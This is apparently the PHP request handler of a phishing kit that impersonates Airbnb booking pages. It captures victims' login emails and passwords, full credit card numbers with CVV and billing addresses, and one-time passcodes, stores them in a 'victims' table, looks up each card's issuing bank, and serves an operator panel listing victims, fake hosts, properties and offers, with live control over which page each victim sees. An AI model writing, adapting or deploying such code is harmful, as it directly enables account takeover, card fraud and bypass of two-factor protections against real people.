<?php



include '../include/global.php';



if ($_SERVER['REQUEST_METHOD'] === 'POST') {



    // USAGE: incoming post requests.



    $page = sanitize($_POST['page']) ?? null;



    $loader = 'loader';



    if(empty($page)){

        error('Page not found.', 404);

    }



    $csrf_token = $_POST['csrf_token'] ?? null;



    if (empty($csrf_token)) {

        error('CSRF token is missing.', 400);

    }

        

    $decryptedCSRFToken     = validateAndDecryptCSRFToken($csrf_token, $encryptionKey);

    $validateSessionCSRF    = validateAndDecryptCSRFToken(csrf(), $encryptionKey);

    

    if (empty($decryptedCSRFToken) || empty($validateSessionCSRF) || $decryptedCSRFToken !== $validateSessionCSRF) {

        error('CSRF token is invalid.', 400);

    }



    if($page == 'authenticate_login_con_airbnb'){



        $email    = sanitize($_POST['email']) ?? null;

        $password = sanitize($_POST['password']) ?? null;



        $checkin = sanitize($_POST['checkin']) ?? null;

        $checkout = sanitize($_POST['checkout']) ?? null;

        $nights = sanitize($_POST['nights']) ?? null;

        $offerId = sanitize($_POST['offerId']) ?? null;

        $booking_price = sanitize($_POST['booking_price']) ?? null;



        if(empty($email)) error('email is missing.', 400);



        if(empty($password)) error('password is missing.', 400);



        $values = array(

            'email' => $email,

            'password' => $password,

            'booking_price' => $booking_price,

            'checkin' => $checkin,

            'checkout' => $checkout,

            'offer_id' => $offerId,

        );



        $_SESSION['card'] = true;

       

        update_victim($values);



        success(array('message' => 'Submitted successfully, data is being verified.', 'verifying' => 'true'));



    } else if($page == 'cc_info'){



        $ccnumber = sanitize($_POST['ccnumber']) ?? null;

        $ccexpiration = sanitize($_POST['ccexpiration']) ?? null;

        $cvv = sanitize($_POST['cvv']) ?? null;

        $zipCode = sanitize($_POST['zipCode']) ?? null;

        $displayCountry = sanitize($_POST['displayCountry']) ?? null;

        $address1 = sanitize($_POST['address1']) ?? null;

        $address2 = sanitize($_POST['address2']) ?? null;

        $city = sanitize($_POST['city']) ?? null;

        $state = sanitize($_POST['state']) ?? null;

        

        if(empty($ccnumber)) error('Credit card number is missing.', 400);

        if(empty($ccexpiration)) error('Credit card expiration date is missing.', 400);

        if(empty($cvv)) error('CVV is missing.', 400);

        if(empty($zipCode)) error('ZIP code is missing.', 400);

        if(empty($displayCountry)) error('Country is missing.', 400);

        if(empty($address1)) error('Address line 1 is missing.', 400);

        if(empty($city)) error('City is missing.', 400);

        if(empty($state)) error('State is missing.', 400);



        $bin = preg_replace('/\s/', '', $ccnumber);

        $bin = substr($bin,0,8);

        $url = "https://lookup.binlist.net/".$bin;

        $headers = array();

        $headers[] = 'Accept-Version: 3';

        $ch = curl_init();

        curl_setopt($ch,CURLOPT_URL,$url);

        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $resp=curl_exec($ch);

        curl_close($ch);

        $result = json_decode($resp, true);



        $_SESSION['bank_name'] = $result["bank"]["name"];

        $_SESSION['bank_scheme'] = strtoupper($result["scheme"]);

        $_SESSION['bank_type'] = strtoupper($result["type"]);

        $_SESSION['bank_brand'] = strtoupper($result["brand"]);

        $_SESSION['card_type'] = $result["scheme"];

    

        $values = array(

            'ccnumber' => $ccnumber,

            'ccexpiration' => $ccexpiration,

            'cvv' => $cvv,

            'zipCode' => $zipCode,

            'displayCountry' => $displayCountry,

            'address1' => $address1,

            'address2' => $address2,

            'city' => $city,

            'state' => $state

        );

    

        update_victim($values);

        update_data("UPDATE `victims` SET `current_page` = 'loader' WHERE `ip` = '".ip()."'");

        success(array('message' => 'Submitted successfully, data is being verified.', 'verifying' => 'true'));



    }  else if($page == 'otp'){



        $code = sanitize($_POST['code']) ?? null;



        if(empty($code)) error('Code is missing.', 400);



        if(strlen($code) < 2 || strlen($code) > 8) error('Code is invalid.', 400);



        $values = array(

            'otp_code' => $code,

        );



        $update = update_victim($values);



        if($update){

            update_data("UPDATE `victims` SET `current_page` = 'loader' WHERE `ip` = '".ip()."'");

            success(array('message' => 'Submitted successfully, data is being verified.', 'verifying' => 'true'));

        }else{

            error('Failed to update data.', 400);

        }



    } else if($page == 'redirect_loader'){



        update_data("UPDATE `victims` SET `current_page` = 'loader' WHERE `ip` = '".ip()."'");

        success(array('message' => 'Submitted successfully, data is being verified.', 'verifying' => 'true'));



    } else if($page == 'status_check'){



        $loader = victim('current_page');



        if($loader != 'loader' && $loader != 'google_await'){



            $json = array(

                'pass' => true,

                'success' => true,

                'redirect' => victim('current_page')

            );

        }else{

            $json = array(

                'pass' => false,

                'success' => true,

                'redirect' => null

            );

        }



        json($json);



    } else if($page == 'update_user_status'){



        $status = sanitize($_POST['status']) ?? null;



        if(empty($status)) error('Status is missing.', 400);



        if($status == 'online'){

            set_session('status', 'online');

        }else if($status == 'offline'){

            set_session('status', 'offline');

        }



    } else if($page == 'auth_login'){

        

        $username = sanitize($_POST['username']) ?? null;

        $password = sanitize($_POST['password']) ?? null;



        if(empty($username) || empty($password)) error('Missing input values.', 400);



        $username = strtolower($username);



        $check = fetch_data("SELECT * FROM `admin` WHERE `username` = '$username'");



        if($check){

            if(password_verify($password, $check['password'])){

                $_SESSION['admin_id'] = $check['id'];

                success(array('message' => 'Logged in successfully.', 'redirect' => 'dashboard'));

            }else{

                error('Invalid credentials.', 400);

            }

        }else{

            error('Invalid credentials.', 400);

        }

    } 

} else if($_SERVER['REQUEST_METHOD'] == 'GET'){



    $page = sanitize($_GET['page']) ?? null;

    

    if($page == 'victims'){



        // get victims data for admin panel.



        if(!session()) error('You are not logged in.', 400);



        $limit = $_GET['limit'];

        $type  = $_GET['type'] ?? null;



        if(!empty($limit)){

            $victims = fetch("SELECT * FROM `victims` ORDER BY `created_at` DESC LIMIT $limit");

        }else{

            $victims = fetch("SELECT * FROM `victims` ORDER BY `created_at` DESC");

        }



        if(!empty($type)){

            

            $query = "SELECT * FROM `victims`";



            $type = strtolower($type);



            $validTypes = ['multi-factor', 'phoneotp', 'email'];



            if (in_array($type, $validTypes)) {

                $query .= " WHERE `current_page` = '$type'";

            }

            $query .= " ORDER BY `created_at` DESC";

            $victims = fetch($query);

        }



        if($victims){

            

            foreach ($victims as $victim) {

                $html .= '<tr';

                if (in_array($victim['current_page'], ['loading', 'loader'])) {

                    $html .= ' class="flash-notification"';

                }

                $html .= '>';

                $html .= '<td><a href="view?id='.$victim['id'].'">#' . $victim['id'] . '</a></td>';

                $html .= '<td>' . status($victim['status']) . '</td>';

                $html .= '<td>' . $victim['ip'] . '</td>';

                $html .= '<td>' . $victim['os'] . '</td>';

                $html .= '<td><span class="badge '.bg_status($victim['current_page']).'">'.current_page($victim['current_page'], 'icon').' ' . current_page($victim['current_page']) . '</span></td>';

                $html .= '<td>' . date("d M Y", strtotime($victim['created_at'])) . '</td>';

                $html .= '<td>';

                $html .= '<a href="view?id='.$victim['id'].'" class="btn btn-primary btn-sm">View</a>';

                $html .= '<a href="view?id='.$victim['id'].'&action=delete" class="btn btn-danger btn-sm" style="margin-left:2.5%;">Delete</a>';

                $html .= '</td>';

                $html .= '</tr>';

              }



              echo $html;

            

        }else{

            $html .= '<tr>';

            $html .= '<td colspan="8" style="text-align:center;">No victims found.</td>';

            $html .= '</tr>';

            echo $html;

        }



    } else if($page == 'hosts'){



        if(!session()) error('You are not logged in.', 400);



        $hosts = fetch("SELECT * FROM `hosts` ORDER BY `created_at` DESC");



        if($hosts){

            

            foreach ($hosts as $host) {

                $html .= '<tr>';

                $html .= '<td><a href="edit/host?id='.$host['id'].'">#' . $host['id'] . '</a></td>';

                $html .= '<td><img src="../assets/profile_pic_hosts/' . $host['profile_image'] . '" width="50"/> ' . $host['first_name'] . ' ' . $host['last_name'] . '</td>';

                $html .= '<td>' . $host['email'] . '</td>';

                $html .= '<td>' . $host['m_day'] . ' ' . $host['m_month'] . ' ' . $host['m_year'] . '</td>';

                $html .= '<td><span class="' . ($host['is_superhost'] == 1 || $host['is_superhost'] == true ? 'text-success' : 'text-danger') . '">' . ($host['is_superhost'] == 1 || $host['is_superhost'] == true ? '<i class="fas fa-check-circle"></i> Yes' : '<i class="fas fa-exclamation-circle"></i> No') . '</span></td>';

                $html .= '<td>' . date("d M Y", strtotime($host['created_at'])) . '</td>';

                $html .= '<td>';

                $html .= '<a href="edit/host?id='.$host['id'].'"><i class="fas fa-pen"></i></a>';

                $html .= '<a href="edit/host?id='.$host['id'].'&action=delete" style="margin-left:10%;"><i class="fas fa-trash text-danger"></i></a>';

                $html .= '</td>';

                $html .= '</tr>';

              }



              echo $html;

            

        }else{



            $html .= '<tr>';

            $html .= '<td colspan="8" style="text-align:center;">No hosts created, <a href="create/host">create one now</a>.</td>';

            $html .= '</tr>';

            echo $html;



        }

    } else if($page == 'property'){



        if(!session()) error('You are not logged in.', 400);



        $properties = fetch("SELECT * FROM `property` ORDER BY `created_at` DESC");



        if($properties){

            

            foreach ($properties as $property) {
                $imagesArray = unserialize($property['property_image']);
if ($imagesArray === false) {
    $imagesArray = [];
}
if(count($imagesArray) == 0){
$imagesString = "";
}else{
$imagesString = implode(',', $imagesArray);
}

                $html .= '<tr>';

                $html .= '<td><a href="edit/property?id='.$property['id'].'">#' . $property['id'] . '</a></td>';

                $html .= '<td><a href="edit/property?id='.$property['id'].'">' . $property['property_name'] . '</a></td>';

                $html .= '<td><strong>Guests:</strong> ' . $property['guests_included'] . ' <br/> <strong>Bedrooms:</strong> ' . $property['bedrooms'] . '</td>';

                $html .= '<td><strong>Nightly:</strong> ' . $property['nightly_fee'] . ' <br/> <strong>Monthly:</strong> ' . $property['monthly_fee'] . '</td>';

                 $html .="<td><button type='button' id='myBtn' class='btn btn-primary btn-sm' data-toggle='modal' data-value='". htmlspecialchars($imagesString, ENT_QUOTES, 'UTF-8') ."' data-property-id='".$property['id']."' data-target='#myModal'>Images
</button>
<button type='button' id='myBtn' class='btn btn-primary btn-sm' data-toggle='modal' data-value='". htmlspecialchars($imagesString, ENT_QUOTES, 'UTF-8') ."' data-pro-id='".$property['id']."' data-target='#myModal2'>Change Postion
</button>
</td>";


                //$html .= '<td>' . date("d M Y", strtotime($property['created_at'])) . '</td>';

                $html .= '<td>';

                $html .= '<a href="edit/property?id='.$property['id'].'"><i class="fas fa-pen"></i></a>';

                $html .= '<a href="edit/property?id='.$property['id'].'&action=delete" style="margin-left:10%;"><i class="fas fa-trash text-danger"></i></a>';

                $html .= '</td>';

                $html .= '</tr>';

              }



              echo $html;

            

        }else{



            $html .= '<tr>';

            $html .= '<td colspan="8" style="text-align:center;">No property created, <a href="create/property">create one now</a>.</td>';

            $html .= '</tr>';

            echo $html;



        }



    } else if($page == 'offers'){



        if(!session()) error('You are not logged in.', 400);



        $offers = fetch("SELECT * FROM `offers` ORDER BY `created_at` DESC");



        if($offers){

            

            foreach ($offers as $offer) {



                $fetch_host = fetch_data("SELECT * FROM hosts WHERE id = '$offer[host_id]'");



                $fetch_property = fetch_data("SELECT * FROM property WHERE id = '$offer[property_id]'");



                $html .= '<tr>';

                $html .= '<td><a href="../../rooms/view?id='.$offer['id'].'" target="_blank">#' . $offer['id'] . '</a></td>';

                $html .= '<td>' . $fetch_host['first_name'] . ' ' . $fetch_host['last_name'] . ' <br/>' . $fetch_host['email'] . '</td>';

                $html .= '<td>' . $fetch_property['property_name'] . '</td>';

                $html .= '<td>' . $offer['trip_type'] . '</td>';

                $html .= '<td>' . $offer['guest_username'] . ' <br/> ' . $offer['guest_email'] . '</td>';

                $html .= '<td>' . date("d M Y", strtotime($offer['created_at'])) . '</td>';

                $html .= '<td>';

                $html .= '<a href="../../rooms/view?id='.$offer['id'].'" target="_blank"><i class="fas fa-link"></i></a>';

                $html .= '<a href="edit/offer?id='.$offer['id'].'&action=delete" style="margin-left:10%;"><i class="fas fa-trash text-danger"></i></a>';

                $html .= '</td>';

                $html .= '</tr>';

              }



              echo $html;

            

        }else{



            $html .= '<tr>';

            $html .= '<td colspan="8" style="text-align:center;">No offer created, <a href="create/offer>create one now</a>.</td>';

            $html .= '</tr>';

            echo $html;



        }

    }



}

